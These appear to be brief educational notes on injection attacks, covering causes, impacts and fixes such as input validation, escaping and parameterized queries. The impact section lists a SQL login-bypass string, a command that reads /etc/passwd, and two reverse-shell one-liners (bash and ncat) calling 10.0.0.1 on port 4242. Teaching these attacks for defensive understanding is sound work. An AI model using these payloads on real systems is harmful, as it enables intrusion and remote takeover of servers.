Injection
  • Injection means to inject
  • An attacker sends a query (basically injected) into any server, if the server interprets it, BOOM !!
  • Any interpreter which combines data into command is vulnerable to injection Attacks
  • Types: SQL Injection, LDAP Injection, OS Injection, Command Execution, Ruby Injection, Shell Shock, etc.


Why Injection Happens
  • Untrusted data directly interpreted.
  • Where can you send the untrusted data?
  • HTTP request,in the form of URL parameters, form fields, headers, or cookies.
  • Everywhere


What can be achieved by Injection
  • If the attacker is able to inject his query or command, he can perform desirable actions into the server.
  • SQLi: "101 or 1=1". (A true query to do login bypass)
  • cat /etc/passwd (command to read users in linux)
  • bash -i >&/dev/tcp/10.0.0.1/4242 0>&1 (one liner bash for reverse connection)
  • ncat 10.0.0.1 4242 -e /bin/bash (one liner nc for reverse connection)


How do we fix Injection issues
  • Validation- means input validation
  • Escaping aka Output Encoding
    • Escaping is the primary means to make sure that untrusted data can't be used to convey an injection attack.
    • There is no harm in escaping data properly- it will still render in the browser properly.
    • Escaping simply lets the interpreter know the data is not intended to be executed, and therefore prevents attacks from working.
  • Parameterized Queries : Using safe interfaces
